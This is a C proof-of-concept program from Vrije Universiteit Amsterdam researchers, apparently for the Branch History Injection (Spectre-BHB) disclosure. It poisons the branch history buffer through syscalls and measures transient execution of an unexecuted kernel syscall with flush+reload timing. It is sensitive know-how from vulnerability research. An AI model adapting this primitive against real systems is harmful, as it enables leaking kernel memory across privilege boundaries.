/*
 * Thursday, September 9th 2021
 *
 * Enrico Barberis - e.barberis@vu.nl
 * Pietro Frigo - p.frigo@vu.nl
 * Marius Muench - m.muench@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <sys/mman.h> 
#include <assert.h>
#include <time.h>
#include <errno.h>
#include "targets.h"
#include "helper.h"
#include "flush_reload.h"

#define ITERS               1000
#define SYSCALL_HIT         448
#define SYSCALL_GETPID      39

extern void fill_bhb(uint8_t *history, uint64_t syscall_nr, uint8_t *fr_buf_kern);

int main(int argc, char **argv)
{
    uint8_t  hit_history[MAX_HISTORY_SIZE];
    uint8_t  getpid_history[MAX_HISTORY_SIZE];
    uint8_t *fr_buf;
    uint8_t *fr_buf_kern;
    int      hits = 0;

    //Create a page accessible both from user and kernel
    fr_buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    memset(fr_buf, 0x42, 0x1000);

    fr_buf_kern = (uint8_t *)(virt_to_physmap((uint64_t)fr_buf));
    printf("%20s: 0x%016lx\n", "fr_buf user", (uint64_t)fr_buf);
    printf("%20s: 0x%016lx\n", "fr_buf kern", (uint64_t)fr_buf_kern);

    //Define once the histories
    srand(time(0));
    for(int i=0; i<MAX_HISTORY_SIZE; i++) hit_history[i] = rand()&1;
    for(int i=0; i<MAX_HISTORY_SIZE; i++) getpid_history[i] = rand()&1;

    for(int i=0; i<ITERS; i++) {

        //Associate histories to corresponding syscall
        fill_bhb(getpid_history,    SYSCALL_GETPID, NULL);
        fill_bhb(hit_history,       SYSCALL_HIT,    fr_buf_kern);

        //Flush 
        clflush(fr_buf);
    
        //We never execute architecturally syscall hit, but let's see
        //if by using hit_history we observe a transient execution of it
        fill_bhb(hit_history,       SYSCALL_GETPID, fr_buf_kern);

        //Reload
        if (load_time(fr_buf) < THR) {
            hits++;
        }
    }

    printf("hits = %d / %d\n", hits, ITERS);

    return 0;
}

